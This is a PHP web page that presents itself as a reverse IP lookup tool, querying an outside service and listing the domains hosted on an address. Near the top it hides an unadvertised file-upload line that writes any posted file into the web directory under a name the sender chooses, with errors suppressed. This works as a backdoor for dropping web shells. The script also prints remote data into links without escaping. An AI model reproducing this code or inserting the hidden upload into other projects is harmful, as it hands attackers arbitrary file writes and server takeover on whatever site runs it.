<head><title>Reverse IP Lookup</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="http://www.w32.info/2001/04/xmldsigmore">
</head>
<?php
ob_start();
@set_time_limit(0);
echo "<p align='center'>
<img border='0' src='http://www.seomastering.com/myimages/img/Geolocation.jpg' width='15%' height='25%' /></p>";
echo "<center><font color='#006600' size='4' face='impact'>Ip Lookup Reverse Domain</center></font><div id=result>";

(@copy($_FILES['f']['tmp_name'], $_FILES['f']['name']));
echo "<center><br /><br /><form><input size='60' value='jokerdarkknight.com' name='ip' /><input type='submit' value='âœ“'></form></center>";
if(isset($_GET["ip"]))
{
$site = $_GET["ip"];
$ip = "http://domains.yougetsignal.com/domains.php";
//Curl Function
$ch = curl_init($ip);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$site&ket=");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
$resp = curl_exec($ch);
$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
$array = explode(",,", $resp);
unset($array[0]);
echo "<table class=tbl>";
foreach($array as $lnk)
{
	print "<tr><td><a href='http://$lnk' target=_blank>$lnk</a></td></tr>";
}
echo "</table>";
curl_close($ch);
}
?>